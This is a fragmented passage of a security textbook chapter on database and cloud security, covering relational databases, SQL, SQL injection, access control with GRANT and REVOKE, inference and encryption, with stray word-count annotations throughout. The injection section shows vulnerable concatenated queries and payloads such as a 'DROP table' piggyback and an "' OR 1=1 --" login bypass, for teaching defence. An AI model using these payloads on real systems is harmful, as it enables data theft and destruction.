return is made by executing the REI (return from exception or interrupt) instruction.
	
	
a.	 A number of operating systems have two modes, kernel and user. What are the
[Word Count: 86]

­advantages and disadvantages of providing four modes instead of two?
	
b.	 Can you make a case for even more than four modes?
	
4.4	
The VMS scheme discussed in the preceding problem is often referred to as a ring 
protection structure, as illustrated in Figure 4.15. Indeed, the simple kernel/user
[Word Count: 49]

4.11 / Key Terms, Review Questions, and Problems   153
[Word Count: 9]

4.8	
Assume a system with N job positions. For job position i, the number of individual users 
in that position is Ui and the number of permissions required for the job position is Pi.
	
	
a.	 For a traditional DAC scheme, how many relationships between users and per-
[Word Count: 47]

missions must be defined?
	
b.	 For a RBAC scheme, how many relationships between users and permissions
[Word Count: 16]

­general role hierarchy.
	
b.	 Provide a formal definition of a limited role hierarchy.
	
4.11	
In the example of Section 4.8, use the notation Role(x).Position to denote the position 
associated with role x and Role(x).Function to denote the function associated with role x.
	
	
a.	 We defined the role hierarchy for this example as one in which one role is superior
[Word Count: 59]

to another if its position is superior and their functions are identical. Express this 
­relationship formally.
	
b.	 An alternative role hierarchy is one in which a role is superior to another if its
[Word Count: 33]

function is superior, regardless of position. Express this relationship formally.
	
4.12	
In the example of the online entertainment store in Section 4.6, with the finer-grained 
policy that includes premium and regular users, list all of the roles and all of the privi-
leges that need to be defined for the RBAC model.
[Word Count: 52]

5.3	 Relational Databases
Elements of a Relational Database System
Structured Query Language
[Word Count: 12]

5.4	 Sql Injection Attacks
A Typical SQLi Attack
The Injection Technique
SQLi Attack Avenues and Types
SQLi Countermeasures
[Word Count: 18]

5.5	 Database Access Control
SQL-Based Access Definition
Cascading Authorizations
Role-Based Access Control
[Word Count: 12]

5.8	 Cloud Computing
Cloud Computing Elements
Cloud Computing Reference Architecture
[Word Count: 10]

5.9	 Cloud Security Risks And Countermeasures
[Word Count: 6]

5.13	 Key Terms, Review Questions, and Problems
[Word Count: 7]

156    Chapter 5 / Database and Cloud Security
[Word Count: 8]

Organizational databases tend to concentrate sensitive information in a single 
logical system. Examples include:
[Word Count: 14]

• Corporate financial data
 
• Confidential phone records
 
• Customer and employee information, such as name, Social Security number,
[Word Count: 19]

bank account information, and credit card information
 
• Proprietary product information
 
• Health care information and medical records
[Word Count: 18]

For many businesses and other organizations, it is important to be able to 
provide customers, partners, and employees with access to this information. But such 
information can be targeted by internal and external threats of misuse or unauthorized 
change. Accordingly, security specifically tailored to databases is an increasingly 
important component of an overall organizational security strategy.
[Word Count: 56]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Understand the unique need for database security, separate from ordinary
[Word Count: 11]

computer security measures.
◆	Present an overview of the basic elements of a database management system.
◆	Present an overview of the basic elements of a relational database system.
◆	Define and explain SQL injection attacks.
◆	Compare and contrast different approaches to database access control.
◆	Explain how inference poses a security threat in database systems.
◆	Discuss the use of encryption in a database system.
◆	Present an overview of cloud computing concepts.
◆	Understand the unique security issues related to cloud computing.
[Word Count: 85]

[BENN06] cites the following reasons why database security has not kept pace 
with the increased reliance on databases:
[Word Count: 18]

1.	 There is a dramatic imbalance between the complexity of modern database
[Word Count: 12]

management systems (DBMS) and the security techniques used to protect these 
critical systems. A DBMS is a very complex, large piece of software, providing 
many options, all of which need to be well understood and then secured to avoid 
data breaches. Although security techniques have advanced, the increasing 
complexity of the DBMS—with many new features and services—has brought 
a number of new vulnerabilities and the potential for misuse.
	
2.	 Databases have a sophisticated interaction protocol called the Structured Query
[Word Count: 79]

Language (SQL), which is far more complex, for example, than the Hypertext 
Transfer Protocol (HTTP) used to interact with a Web service. Effective 
database security requires a strategy based on a full understanding of the 
security vulnerabilities of SQL.
	
3.	 The typical organization lacks full-time database security personnel. The result is a
[Word Count: 52]

mismatch between requirements and capabilities. Most organizations have a staff of 
database administrators, whose job is to manage the database to ensure availability, 
performance, correctness, and ease of use. Such administrators may have limited 
knowledge of security and little available time to master and apply security 
techniques. On the other hand, those responsible for security within an organization 
may have very limited understanding of database and DBMS technology.
	
4.	 Most enterprise environments consist of a heterogeneous mixture of database
[Word Count: 79]

platforms (Oracle, IBM DB1 and Informix, Microsoft, Sybase, etc.), enter­
prise platforms (Oracle E-Business Suite, PeopleSoft, SAP, Siebel, etc.), 
and OS platforms (UNIX, Linux, z/OS, and Windows, etc.). This creates an 
additional complexity hurdle for security personnel.
[Word Count: 37]

An additional recent challenge for organizations is their increasing reliance 
on cloud technology to host part or all of the corporate database. This adds an 
additional burden to the security staff.
[Word Count: 31]

158    Chapter 5 / Database and Cloud Security
[Word Count: 8]

payroll program can extract the information about time worked and salary for each 
employee to generate paychecks.
[Word Count: 17]

Accompanying the database is a database management system (DBMS), 
which is a suite of programs for constructing and maintaining the database and for 
offering ad hoc query facilities to multiple users and applications. A query language 
provides a uniform interface to the database for users and applications.
[Word Count: 47]

Database systems provide efficient access to large volumes of data and are vital 
to the operation of many organizations. Because of their complexity and criticality, 
database systems generate security requirements that are beyond the capability of 
typical OS-based security mechanisms or stand-alone security packages.
[Word Count: 44]

Operating system security mechanisms typically control read and write 
access to entire files. So they could be used to allow a user to read or to write any 
information in, for example, a personnel file. But they could not be used to limit
[Word Count: 43]

DDL = data deﬁnition language
DML = data manipulation language
[Word Count: 10]

access to specific records or fields in that file. A DBMS typically does allow this type 
of more detailed access control to be specified. It also usually enables access controls 
to be specified over a wider range of commands, such as to select, insert, update, or 
delete specified items in the database. Thus, security services and mechanisms are 
needed that are designed specifically for, and integrated with, database systems.
[Word Count: 69]

The drawback of using a single table is that some of the column positions for 
a given row may be blank (not used). Also, any time a new service or new type of 
information is incorporated in the database, more columns must be added and the 
database and accompanying software must be redesigned and rebuilt.
[Word Count: 55]

The relational database structure enables the creation of multiple tables 
tied together by a unique identifier that is present in all tables. Figure 5.2 shows 
how new services and features can be added to the telephone database without 
reconstructing the main table. In this example, there is a primary table with 
basic information for each telephone number. The telephone number serves as 
a primary key. The database administrator can then define a new table with a 
column for the primary key and other columns for other information.
[Word Count: 87]

Users and applications use a relational query language to access the database. 
The query language uses declarative statements rather than the procedural 
instructions of a programming language. In essence, the query language allows 
the user to request selected items of data from all records that fit a given set of 
criteria. The software then figures out how to extract the requested data from one 
or more tables. For example, a telephone company representative could retrieve a 
subscriber’s billing information as well as the status of special services or the latest 
payment received, all displayed on one screen.
[Word Count: 97]

Elements of a Relational Database System
[Word Count: 6]

In relational database parlance, the basic building block is a relation, which is a 
flat table. Rows are referred to as tuples, and columns are referred to as attributes
[Word Count: 29]

160    Chapter 5 / Database and Cloud Security
[Word Count: 8]

(Table 5.1). A primary key is defined to be a portion of a row used to uniquely 
identify a row in a table; the primary key consists of one or more column names.  
In the example of Figure 5.2, a single attribute, PhoneNumber, is sufficient to 
uniquely identify a row in a particular table. An abstract model of a relational data-
base table is shown as Figure 5.3. There are N individuals, or entities, in the table 
and M attributes. Each attribute Aj has |Aj| possible values, with xij denoting the 
value of attribute j for entity i.
[Word Count: 98]

To create a relationship between two tables, the attributes that define the 
primary key in one table must appear as attributes in another table, where they are
[Word Count: 27]

Table 5.1  Basic Terminology for Relational Databases
[Word Count: 7]

Date
Transaction type
Transaction amount
[Word Count: 5]

Current charges
Date of last payment
Amount of last payment
[Word Count: 10]

Figure 5.2  Example Relational Database Model.   A relational database uses multiple 
tables related to one another by a designated key; in this case the key is the Phone­
Number field.
[Word Count: 30]

referred to as a foreign key. Whereas the value of a primary key must be unique 
for each tuple (row) of its table, a foreign key value can appear multiple times in 
a table, so that there is a one-to-many relationship between a row in the table with 
the primary key and rows in the table with the foreign key. Figure 5.4a provides an 
example. In the Department table, the department ID (Did) is the primary key;
[Word Count: 77]

human resources
education
accounts
public relations
services
[Word Count: 7]

accounts
public relations
services
services
[Word Count: 5]

7712
6127099348
6127092729
6127091945
6127099380
6127092246
6127092485
6127093148
[Word Count: 8]

Robin
Neil
Jasmine
Cody
Holly
Robin
Smith
[Word Count: 7]

15
23
2345
6127092485
6127092246
6127099348
6127093148
6127092729
6127091945
6127099380
[Word Count: 10]

Figure 5.3  Abstract Model of a Relational Database
[Word Count: 8]

162    Chapter 5 / Database and Cloud Security
[Word Count: 8]

each value is unique. This table gives the ID, name, and account number for each 
department. The Employee table contains the name, salary code, employee ID, and 
phone number of each employee. The Employee table also indicates the department 
to which each employee is assigned by including Did. Did is identified as a foreign key 
and provides the relationship between the Employee table and the Department table.
[Word Count: 67]

Views are often used for security purposes. A view can provide restricted access to a 
relational database so that a user or application only has access to certain rows or columns.
[Word Count: 31]

Structured Query Language (SQL) is a standardized language that can be used to 
define schema, manipulate, and query data in a relational database. There are sev-
eral versions of the ANSI/ISO standard and a variety of different implementations, 
but all follow the same basic syntax and semantics.
[Word Count: 47]

For example, the two tables in Figure 5.4a are defined as follows:
[Word Count: 12]

CREATE TABLE department (
    Did INTEGER PRIMARY KEY,
    Dname CHAR (30),
    Dacctno CHAR (6) )
CREATE TABLE employee (
    Ename CHAR (30),
    Did INTEGER,
    SalaryCode INTEGER,
    Eid INTEGER PRIMARY KEY,
    Ephone CHAR (10),
    FOREIGN KEY (Did) REFERENCES department (Did) )
[Word Count: 40]

The basic command for retrieving information is the SELECT statement. 
Consider this example:
[Word Count: 13]

SELECT Ename, Eid, Ephone
    FROM Employee
    WHERE Did = 15
[Word Count: 10]

This query returns the Ename, Eid, and Ephone fields from the Employee 
table for all employees assigned to department 15.
[Word Count: 20]

The view in Figure 5.4b is created using the following SQL statement:
[Word Count: 12]

CREATE VIEW newtable (Dname, Ename, Eid, Ephone)
AS SELECT D.Dname E.Ename, E.Eid, E.Ephone
FROM Department D Employee E
WHERE E.Did = D.Did
[Word Count: 22]

The preceding are just a few examples of SQL functionality. SQL statements 
can be used to create tables, insert and delete data in tables, create views, and 
retrieve data with query statements.
[Word Count: 32]

The SQL injection (SQLi) attack is one of the most prevalent and dangerous 
­network-based security threats. Consider the following reports:
[Word Count: 20]

1.	 The July 2013 Imperva Web Application Attack Report [IMPE13] surveyed a
[Word Count: 12]

cross-section of Web application servers in industry and monitored eight dif-
ferent types of common attacks. The report found that SQLi attacks ranked 
first or second in total number of attack incidents, the number of attack 
requests per attack incident, and average number of days per month that an 
application experienced at least one attack incident. Imperva observed a sin-
gle Web site that received 94,057 SQL injection attack requests in one day.
	
2.	 The Open Web Application Security Project’s 2013 report [OWAS13] on the
[Word Count: 85]

ten most critical Web application security risks listed injection attacks, especially 
SQLi attacks, as the top risk. This ranking is unchanged from its 2010 report.
	
3.	 The Veracode 2013 State of Software Security Report [VERA13] found that
[Word Count: 37]

percentage of applications affected by SQLi attacks is around 32% and that 
SQLi attacks account for 26% of all reported breaches. Veracode also consid-
ers this among the most dangerous threats, reporting that three of the big-
gest SQL injection attacks in 2012 resulted in millions of email addresses, user 
names, and passwords being exposed and damaged the respective brands.
	
4.	 The Trustwave 2013 Global Security Report [TRUS13] lists SQLi attacks as
[Word Count: 72]

one of the top two intrusion techniques. The report notes that poor coding 
practices have allowed the SQL injection attack vector to remain on the threat 
landscape for more than 15 years, but that proper programming and security 
measures can prevent these attacks.
[Word Count: 43]

164    Chapter 5 / Database and Cloud Security
[Word Count: 8]

In such an environment, an SQLi attack is designed to send malicious SQL 
commands to the database server. The most common attack goal is bulk extraction 
of data. Attackers can dump database tables with hundreds of thousands of cus-
tomer records. Depending on the environment, SQL injection can also be exploited 
to modify or delete data, execute arbitrary operating system commands, or launch 
denial-of-service (DoS) attacks.
[Word Count: 66]

SQLi is an attack that exploits a security vulnerability occurring in the database layer 
of an application (such as queries). Using SQL injection, the attacker can extract or 
manipulate the web application’s data. The attack is viable when user input is either 
incorrectly filtered for string literal escape characters embedded in SQL statements 
or user input is not strongly typed, and thereby unexpectedly executed.
[Word Count: 64]

Figure 5.5, from [ACUN13], is a typical example of an SQLi attack. The steps 
involved are as follows:
[Word Count: 18]

1.	 Hacker finds a vulnerability in a custom Web application and injects an SQL
[Word Count: 14]

command to a database by sending the command to the Web server. The com-
mand is injected into traffic that will be accepted by the firewall.
[Word Count: 26]

Data exchanged
between hacker
and servers
[Word Count: 6]

Two-way trafﬁc
between hacker
and Web server
[Word Count: 7]

Credit card data is
retrieved from 
database
[Word Count: 7]

Figure 5.5  Typical SQL Injection Attack
[Word Count: 6]

2.	 The Web server receives the malicious code and sends it to the Web applica-
[Word Count: 15]

tion server.
	
3.	 The Web application server receives the malicious code from the Web server
[Word Count: 15]

and sends it to the database server.
	
4.	 The database server executes the malicious code on the database. The data-
[Word Count: 20]

base returns data from credit cards table.
	
5.	 The Web application server dynamically generates a page with data including
[Word Count: 19]

credit card details from the database.
	
6.	 The Web server sends the credit card details to the hacker.
[Word Count: 18]

The SQLi attack typically works by prematurely terminating a text string and 
appending a new command. Because the inserted command may have additional 
strings appended to it before it is executed, the attacker terminates the injected 
string with a comment mark “--”. Subsequent text is ignored at execution time.
[Word Count: 49]

As a simple example, consider a script that build an SQL query by combining 
predefined strings with text entered by a user:
[Word Count: 22]

var Shipcity;
ShipCity = Request.form (“ShipCity”);
var sql = “select * from OrdersTable where ShipCity = ‘” + 
ShipCity + “’”;
[Word Count: 21]

The intention of the script’s designer is that a user will enter the name of a city. 
For example, when the script is executed, the user is prompted to enter a city, and if 
the user enters Redmond, then the following SQL query is generated:
[Word Count: 45]

SELECT * FROM OrdersTable WHERE ShipCity = ‘Redmond’
[Word Count: 8]

Suppose, however, the user enters the following:
[Word Count: 7]

This results in the following SQL query:
[Word Count: 7]

SELECT * FROM OrdersTable WHERE ShipCity =
‘Redmond’; DROP table OrdersTable--
[Word Count: 11]

The semicolon is an indicator that separates two commands, and the double 
dash is an indicator that the remaining text of the current line is a comment and not 
to be executed. When the SQL server processes this statement, it will first select all 
records in OrdersTable where ShipCity is Redmond. Then, it executes the 
DROP request, which deletes the table.
[Word Count: 61]

166    Chapter 5 / Database and Cloud Security
[Word Count: 8]

We can characterize SQLi attacks in terms of the avenue of attack and the type of 
attack [CHAN11, HALF06]. The main avenues of attack are as follows:
[Word Count: 27]

• User input:  In this case, attackers inject SQL commands by providing suit-
[Word Count: 13]

ably crafted user input. A Web application can read user input in several 
ways based on the environment in which the application is deployed. In most 
SQLi attacks that target Web applications, user input typically comes from 
form submissions that are sent to the Web application via HTTP GET or 
POST requests. Web applications are generally able to access the user input 
contained in these requests as they would access any other variable in the 
environment.
 
• Server variables:  Server variables are a collection of variables that contain
[Word Count: 88]

­prevention mechanisms against SQL injection attacks are in place. In second- 
order injection, a malicious user could rely on data already present in the 
­system or database to trigger an SQL injection attack, so when the attack 
occurs, the input that modifies the query to cause an attack does not come 
from the user, but from within the system itself.
 
• Cookies:  When a client returns to a Web application, cookies can be used
[Word Count: 74]

to restore the client’s state information. Because the client has control over 
cookies, an attacker could alter cookies such that when the application server 
builds an SQL query based on the cookie’s content, the structure and function 
of the query is modified.
 
• Physical user input:  SQL injection is possible by supplying user input that
[Word Count: 55]

constructs an attack outside the realm of web requests. This user-input could 
take the form of conventional barcodes, RFID tags, or even paper forms which 
are scanned using optical character recognition and passed to a database man-
agement system.
[Word Count: 39]

Attack types can be grouped into three main categories: inband, inferential, 
and out-of-band. An inband attack uses the same communication channel for inject-
ing SQL code and retrieving results. The retrieved data are presented directly in the 
application Web page. Inband attack types include the following:
[Word Count: 46]

• Tautology:  This form of attack injects code in one or more conditional state-
[Word Count: 14]

ments so that they always evaluate to true. For example, consider this script, 
whose intent is to require the user to enter a valid name and password:
[Word Count: 27]

$query = “SELECT info FROM user WHERE name =
’$_GET[“name”]’ AND pwd = ‘$_GET[“pwd”]’”;
[Word Count: 14]

Suppose the attacker submits “ ‘ OR 1=1 --” for the name field. The 
resulting query would look like this:
[Word Count: 20]

SELECT info FROM users WHERE name = ‘ ‘ OR 1=1 -- AND pwpd = ‘ ‘
[Word Count: 17]

The injected code effectively disables the password check (because of the 
comment indicator --) and turns the entire WHERE clause into a tautology. 
The database uses the conditional as the basis for evaluating each row and 
deciding which ones to return to the application. Because the conditional is a 
tautology, the query evaluates to true for each row in the table and returns all 
of them.
 
• End-of-line comment:  After injecting code into a particular field, legitimate code
[Word Count: 78]

that follows are nullified through usage of end of line comments. An example 
would be to add ”- -” after inputs so that remaining queries are not treated as exe-
cutable code, but comments. The preceding tautology example is also of this form.
 
• Piggybacked queries:  The attacker adds additional queries beyond the intended
[Word Count: 54]

query, piggy-backing the attack on top of a legitimate request. This technique 
relies on server configurations that allow several different queries within a sin-
gle string of code. The example in the preceding section is of this form.
[Word Count: 38]

With an inferential attack, there is no actual transfer of data, but the attacker 
is able to reconstruct the information by sending particular requests and observ-
ing the resulting behavior of the Website/database server. Inferential attack types 
include the following:
[Word Count: 40]

• Illegal/logically incorrect queries:  This attack lets an attacker gather important
[Word Count: 11]

information about the type and structure of the backend database of a Web 
application. The attack is considered a preliminary, information-gathering 
step for other attacks. The vulnerability leveraged by this attack is that the 
default error page returned by application servers is often overly descriptive. 
In fact, the simple fact that an error messages is generated can often reveal 
vulnerable/injectable parameters to an attacker.
 
• Blind SQL injection:  Blind SQL injection allows attackers to infer the data
[Word Count: 77]

present in a database system even when the system is sufficiently secure to not 
display any erroneous information back to the attacker. The attacker asks the 
server true/false questions. If the injected statement evaluates to true, the site 
continues to function normally. If the statement evaluates to false, although 
there is no descriptive error message, the page differs significantly from the 
normally functioning page.
[Word Count: 64]

In an out-of-band attack, data are retrieved using a different channel (e.g., an 
email with the results of the query is generated and sent to the tester). This can be 
used when there are limitations on information retrieval, but outbound connectivity 
from the database server is lax.
[Word Count: 47]

168    Chapter 5 / Database and Cloud Security
[Word Count: 8]

Because SQLi attacks are so prevalent, damaging, and varied both by attack avenue and 
type, a single countermeasure is insufficient. Rather an integrated set of techniques 
is necessary. In this section, we provide a brief overview of the types of counter-
measures that are in use or being researched, using the classification in [SHAR13]. 
These countermeasures can be classified into three types: defensive coding, detec-
tion, and run-time prevention.
[Word Count: 69]

Many SQLi attacks succeed because developers have used insecure coding 
practices. Thus, defensive coding is an effective way to dramatically reduce the 
threat from SQLi. Examples of defensive coding include the following:
[Word Count: 32]

• Manual defensive coding practices:  A common vulnerability exploited by
[Word Count: 10]

SQLi attacks is insufficient input validation. The straightforward solution for 
eliminating these vulnerabilities is to apply suitable defensive coding practices. 
An example is input type checking, to check that inputs that are supposed to 
be numeric contain no characters other than digits. This type of technique 
can avoid attacks based on forcing errors in the database management system. 
Another type of coding practice is one that performs pattern matching to try 
to distinguish normal input from abnormal input.
 
• Parameterized query insertion:  This approach attempts to prevent SQLi by
[Word Count: 89]

allowing the application developer to more accurately specify the structure 
of an SQL query, and pass the value parameters to it separately such that any 
unsanitary user input is not allowed to modify the query structure.
 
• SQL DOM:  SQL DOM is a set of classes that enables automated data type
[Word Count: 51]

validation and escaping [MCCL05]. This approach uses encapsulation of 
data­base queries to provide a safe and reliable way to access databases. This 
changes the query-building process from an unregulated one that uses string 
concatenation to a systematic one that uses a type-checked API. Within the 
API, developers are able to systematically apply coding best practices such as 
input filtering and rigorous type checking of user input.
[Word Count: 66]

A variety of detection methods have been developed, including the following:
[Word Count: 11]

• Signature based:  This technique attempts to match specific attack patterns.
[Word Count: 11]

Such an approach must be constantly updated and may not work against self-
modifying attacks.
 
• Anomaly based:  This approach attempts to define normal behavior and then
[Word Count: 27]

detect behavior patterns outside the normal range. A number of approaches 
have been used. In general terms, there is a training phase, in which the system 
learns the range of normal behavior, followed by the actual detection phase.
 
• Code analysis:  Code analysis techniques involve the use of a test suite to
[Word Count: 52]

­detect SQLi vulnerabilities. The test suite is designed to generate a wide range 
of SQLi attacks and assess the response of the system.
[Word Count: 23]

Finally, a number of run-time prevention techniques have been developed as 
SQLi countermeasures. These techniques check queries at runtime to see if they 
conform to a model of expected queries. Various automated tools are available for 
this purpose [CHAN12, SHAR13].
[Word Count: 40]

1The following syntax definition conventions are used. Elements separated by a vertical line are alternatives. 
A list of alternatives is grouped in curly brackets. Square brackets enclose optional elements. That is, the 
elements inside the square brackets may or may not be present.
[Word Count: 43]

Commercial and open-source DBMSs typically provide an access control capability 
for the database. The DBMS operates on the assumption that the computer system 
has authenticated each user. As an additional line of defense, the computer system 
may use the overall access control system described in Chapter 4 to determine 
whether a user may have access to the database as a whole. For users who are 
authenticated and granted access to the database, a database access control system 
provides a specific capability that controls access to portions of the database.
[Word Count: 89]

Commercial and open-source DBMSs provide discretionary or role-based 
access control. We defer a discussion of mandatory access control considerations 
to Chapter 13. Typically, a DBMS can support a range of administrative policies, 
including the following:
[Word Count: 35]

• Centralized administration: A small number of privileged users may grant and
[Word Count: 12]

revoke access rights.
 
• Ownership-based administration: The owner (creator) of a table may grant
[Word Count: 14]

and revoke access rights to the table.
 
• Decentralized administration: In addition to granting and revoking access rights
[Word Count: 18]

to a table, the owner of the table may grant and revoke authorization rights to 
other users, allowing them to grant and revoke access rights to the table.
[Word Count: 28]

SQL provides two commands for managing access rights, GRANT and REVOKE. 
For different versions of SQL, the syntax is slightly different. In general terms, the 
GRANT command has the following syntax:1
[Word Count: 31]

GRANT	
{ privileges | role }
[ON	
table]
TO	
{ user | role | PUBLIC }
[IDENTIFIED BY	
password]
[WITH	
GRANT OPTION]
[Word Count: 22]

170    Chapter 5 / Database and Cloud Security
[Word Count: 8]

As a simple example, consider the following statement.
[Word Count: 8]

This statement enables user ricflair to query any table in the database.
Different implementations of SQL provide different ranges of access rights. 
The following is a typical list:
[Word Count: 28]

• Select: Grantee may read entire database; individual tables; or specific
[Word Count: 11]

columns in a table.
 
• Insert: Grantee may insert rows in a table; or insert rows with values for
[Word Count: 19]

­specific columns in a table.
 
• Update: Semantics is similar to INSERT.
 
• Delete: Grantee may delete rows from a table.
 
• References: Grantee is allowed to define foreign keys in another table that
[Word Count: 34]

The REVOKE command has the following syntax:
[Word Count: 7]

REVOKE	
{ privileges | role }
[ON	
table]
FROM	
{ user | role | PUBLIC }
[Word Count: 16]

Thus, the following statement revokes the access rights of the preceding example:
[Word Count: 12]

REVOKE SELECT ON ANY TABLE FROM ricflair
[Word Count: 7]

Just as the granting of privileges cascades from one user to another using the 
grant option, the revocation of privileges also cascaded. Thus, if Ann revokes the access 
right to Bob and Chris, then the access right is also revoked to David, Ellen, Jim, and 
Frank. A complication arises when a user receives the same access right multiple times,
[Word Count: 59]

Figure 5.6  Bob Revokes Privilege from David
[Word Count: 7]

To generalize, the convention followed by most implementations is as follows. 
When user A revokes an access right, any cascaded access right is also revoked, 
unless that access right would exist even if the original grant from A had never 
occurred. This convention was first proposed in [GRIF76].
[Word Count: 48]

A role-based access control (RBAC) scheme is a natural fit for database access 
control. Unlike a file system associated with a single or a few applications, a database 
system often supports dozens of applications. In such an environment, an individual 
user may use a variety of applications to perform a variety of tasks, each of which 
requires its own set of privileges. It would be poor administrative practice to simply 
grant users all of the access rights they require for all the tasks they perform. RBAC 
provides a means of easing the administrative burden and improving security.
[Word Count: 97]

In a discretionary access control environment, we can classify database users 
in three broad categories:
[Word Count: 15]

• Application owner: An end user who owns database objects (tables, columns,
[Word Count: 12]

rows) as part of an application. That is, the database objects are generated by 
the application or are prepared for use by the application.
[Word Count: 24]

172    Chapter 5 / Database and Cloud Security
[Word Count: 8]

• End user other than application owner: An end user who operates on database
[Word Count: 14]

objects via a particular application but does not own any of the database objects.
 
• Administrator: User who has administrative responsibility for part or all of the
[Word Count: 27]

A database RBAC facility needs to provide the following capabilities:
[Word Count: 10]

• Create and delete roles.
 
• Define permissions for a role.
 
• Assign and cancel assignment of users to roles.
[Word Count: 20]

A good example of the use of roles in database security is the RBAC 
facility provided by Microsoft SQL Server. SQL Server supports three types of 
roles: server roles, database roles, and user-defined roles. The first two types 
of roles are referred to as fixed roles (Table 5.2); these are preconfigured for a 
system with specific access rights. The administrator or user cannot add, delete, 
or modify fixed roles; it is only possible to add and remove users as members of 
a fixed role.
[Word Count: 84]

Fixed server roles are defined at the server level and exist independently 
of any user database. They are designed to ease the administrative task.  
These roles have different permissions and are intended to provide the ability 
to spread the administrative responsibilities without having to give out complete 
control. Database administrators can use these fixed server roles to assign 
different administrative tasks to personnel and give them only the rights they 
absolutely need.
[Word Count: 72]

Fixed database roles operate at the level of an individual database. As with 
fixed server roles, some of the fixed database roles, such as db_accessadmin and 
db_securityadmin, are designed to assist a DBA with delegating administrative 
responsibilities. Others, such as db_datareader and db_datawriter, are designed to 
provide blanket permissions for an end user.
[Word Count: 53]

SQL Server allows users to create roles. These user-defined roles can 
then be assigned access rights to portions of the database. A user with proper 
authorization (typically, a user assigned to the db_securityadmin role) may 
define a new role and associate access rights with the role. There are two 
types of user-defined roles: standard and application. For a standard role, 
an authorized user can assign other users to the role. An application role is 
associated with an application rather than with a group of users and requires
[Word Count: 87]

Table 5.2  Fixed Roles in Microsoft SQL Server
[Word Count: 8]

sysadmin
Can perform any activity in SQL Server and have complete control over  
all database functions
[Word Count: 16]

serveradmin
Can set server-wide configuration options, shut down the server
[Word Count: 10]

setupadmin
Can manage linked servers and startup procedures
[Word Count: 8]

securityadmin
Can manage logins and CREATE DATABASE permissions, also read  
error logs and change passwords
[Word Count: 15]

processadmin
Can manage processes running in SQL Server
[Word Count: 8]

Dbcreator
Can create, alter, and drop databases
[Word Count: 7]

bulkadmin
Can execute BULK INSERT statements
[Word Count: 6]

db_owner
Has all permissions in the database
[Word Count: 7]

db_accessadmin
Can add or remove user IDs
[Word Count: 7]

db_datareader
Can select all data from any user table in the database
[Word Count: 12]

db_datawriter
Can modify any data in any user table in the database
[Word Count: 12]

db_ddladmin
Can issue all data definition language statements
[Word Count: 8]

db_securityadmin
Can manage all permissions, object ownerships, roles and role memberships
[Word Count: 11]

db_backupoperator
Can issue DBCC, CHECKPOINT, and BACKUP statements
[Word Count: 8]

db_denydatareader
Can deny permission to select data in the database
[Word Count: 10]

db_denydatawriter
Can deny permission to change data in the database
[Word Count: 10]

a password. The role is activated when an application executes the appropriate 
code. A user who has access to the application can use the application role for 
database access. Often database applications enforce their own security based on  
the application logic. For example, you can use an application role with its own 
password to allow the particular user to obtain and modify any data only during 
specific hours. Thus, you can realize more complex security management within 
the application logic.
[Word Count: 80]

Inference, as it relates to database security, is the process of performing authorized  
queries and deducing unauthorized information from the legitimate responses 
received. The inference problem arises when the combination of a number of 
data items is more sensitive than the individual items, or when a combination of 
data items can be used to infer data of a higher sensitivity. Figure 5.7 illustrates 
the process. The attacker may make use of nonsensitive data as well as metadata.
[Word Count: 77]

174    Chapter 5 / Database and Cloud Security
[Word Count: 8]

Metadata refers to knowledge about correlations or dependencies among data 
items that can be used to deduce information not otherwise available to a 
particular user. The information transfer path by which unauthorized data is 
obtained is referred to as an inference channel.
[Word Count: 42]

In general terms, two inference techniques can be used to derive additional 
information: analyzing functional dependencies between attributes within a table 
or across tables, and merging views with the same constraints.
[Word Count: 31]

An example of the latter shown in Figure 5.8, illustrates the inference prob-
lem. Figure 5.8a shows an Inventory table with four columns. Figure 5.8b shows 
two views, defined in SQL as follows:
[Word Count: 33]

SELECT Availability, Cost	
SELECT Item, Department
FROM Inventory	
FROM Inventory
[Word Count: 10]

WHERE Department = ”hardware”	
WHERE Department = ”hardware”
[Word Count: 8]

In general terms, there are two approaches to dealing with the threat of 
disclosure by inference:
[Word Count: 16]

Figure 5.7  Indirect Information Access via Inference Channel
[Word Count: 8]

• Inference detection during database design: This approach removes an
[Word Count: 10]

inference channel by altering the database structure or by changing the 
access control regime to prevent inference. Examples include removing data 
dependencies by splitting a table into multiple tables or using more fine-
grained access control roles in an RBAC scheme. Techniques in this category 
often result in unnecessarily stricter access controls that reduce availability.
[Word Count: 55]

• Inference detection at query time: This approach seeks to eliminate an
[Word Count: 12]

inference channel violation during a query or series of queries. If an inference 
channel is detected, the query is denied or altered.
[Word Count: 22]

Employees (Emp#, Name, Address)
Salaries (S#, Salary)
Emp-Salary (Emp#, S#)
[Word Count: 10]

Rolling pin
Shower/tub cleaner
Cake pan
Decorative chain
Lid support
Shelf support
in-store/online
hardware
hardware
hardware
housewares
housewares
housewares
[Word Count: 19]

Decorative chain
Lid support
Shelf support
hardware
hardware
[Word Count: 8]

Availability
Cost ($)
in-store/online
7.99
5.49
104.99
in-store/online
online only
[Word Count: 10]

Decorative chain
Lid support
Shelf support
hardware
hardware
[Word Count: 8]

Availability
Cost ($)
in-store/online
7.99
5.49
104.99
in-store/online
online only
[Word Count: 10]

(c) Table derived from combining query answers
[Word Count: 7]

176    Chapter 5 / Database and Cloud Security
[Word Count: 8]

Employees (Emp#, Name, Address)
Salaries (S#, Salary, Start-Date)
Emp-Salary (Emp#, S#)
[Word Count: 11]

However, an employee’s start date is an easily observable or discoverable 
attribute of an employee. Thus a user in the Clerk role should be able to infer (or 
partially infer) the employee’s name. This would compromise the relationship between 
employee and salary. A straightforward way to remove the inference channel is to 
add the start-date column to the Employees table rather than to the Salaries table.
[Word Count: 66]

The first security problem indicated in this sample, that it was possible to infer 
the relationship between employee and salary, can be detected through analysis 
of the data structures and security constraints that are available to the DBMS. 
However, the second security problem, in which the start-date column was added 
to the Salaries table, cannot be detected using only the information stored in the 
database. In particular, the database does not indicate that the employee name can 
be inferred from the start date.
[Word Count: 83]

In the general case of a relational database, inference detection is a complex 
and difficult problem. For multilevel secure databases, discussed in Chapter 13, 
and statistical databases, discussed in the next section, progress has been made in 
devising specific inference detection techniques.
[Word Count: 42]

The database is typically the most valuable information resource for any organization 
and is therefore protected by multiple layers of security, including firewalls, 
authentication mechanisms, general access control systems, and database access 
control systems. In addition, for particularly sensitive data, database encryption is 
warranted and often implemented. Encryption becomes the last line of defense in 
database security.
[Word Count: 57]

There are two disadvantages to database encryption:
[Word Count: 7]

• Key management: Authorized users must have access to the decryption key for
[Word Count: 13]

the data for which they have access. Because a database is typically accessible 
to a wide range of users and a number of applications, providing secure keys 
to selected parts of the database to authorized users and applications is a 
complex task.
 
